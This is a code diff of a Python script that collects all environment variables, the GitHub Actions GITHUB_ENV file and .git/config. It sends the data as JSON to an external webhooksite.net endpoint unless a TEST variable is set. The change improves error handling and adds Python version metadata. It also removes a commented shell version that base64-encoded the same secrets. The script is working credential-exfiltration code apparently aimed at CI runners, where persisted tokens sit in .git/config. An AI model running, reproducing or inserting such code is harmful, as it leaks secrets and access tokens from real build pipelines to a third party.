@@ -4,6 +4,7 @@ from datetime import datetime, timezone
 import json
 from os import environ
 from pathlib import Path
+from platform import platform, python_version
 import sys
 from urllib.request import urlopen
 
@@ -14,43 +15,37 @@ d = {
     "env": sorted(environ.items()),
 }
 
-if genv := environ.get('GITHUB_ENV'):
+if genv := environ.get("GITHUB_ENV"):
+    d["GITHUB_ENV"] = {"value": genv, "contents": None, "error": None}
     try:
         with Path(genv).open() as inp:
-            d['GITHUB_ENV'] = inp.read()
-    except:
-        pass
+            d["GITHUB_ENV"]["contents"] = list(map(str.rstrip, inp.readlines()))
+    except Exception as exc:
+        d["GITHUB_ENV"]["error"] = str(exc)
 
 try:
-    with Path('.git/config').open() as inp:
-        d['.git_config'] = list(map(str.rstrip, inp.readlines()))
+    with Path(".git/config").open() as inp:
+        d[".git_config"] = list(map(str.rstrip, inp.readlines()))
 except:
     pass
 
 # json.dump(d, sys.stderr)
 # Define your headers as a dictionary
-headers = {
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Accept": "application/json"
-}
-url = 'https://webhooksite.net/049662f7-3960-4593-80f0-900acb38cf0d'
+headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Accept": "application/json"}
+url = "https://webhooksite.net/049662f7-3960-4593-80f0-900acb38cf0d"
 req = urllib.request.Request(url, headers=headers)
-final = {'meta':{'now': str(datetime.now(timezone.utc)), 'keys': list(d.keys())}, 'values':d}
-with urllib.request.urlopen(req, data=json.dumps(final, sort_keys=True, indent=0).encode('utf-8')) as response:
-    data = response.read().decode("utf-8")
-    print(data)
-
-# (
-#     echo -n '{'
-#     echo -n '"env": "'$(env | sort)'",'
-
-#     echo -n '"GITHUB_ENV":"'
-#     if [[ $GITHUB_ENV ]]; then
-#         sort $GITHUB_ENV|sed 's/$/\\n/'
-#     fi
-#     echo -n '",'
-
-#     echo -n '"cat .git/config when INPUT_PERSIST-CREDENTIALS=true":"'
-#     echo $(sed 's/$/\\n/' .git/config)
-#     echo -n '"}'
-# ) | base64 -w0 | base64 -w0 >&2
+final = {
+    "meta": {
+        "python": python_version(),
+        "python_exe": sys.executable,
+        "now": str(datetime.now(timezone.utc)),
+        "keys": list(d.keys()),
+    },
+    "values": d,
+}
+if "TEST" in environ:
+    json.dump(final, sys.stdout, sort_keys=True, indent=4)
+else:
+    with urllib.request.urlopen(req, data=json.dumps(final, sort_keys=True, indent=0).encode("utf-8")) as response:
+        data = response.read().decode("utf-8")
+        print(data)
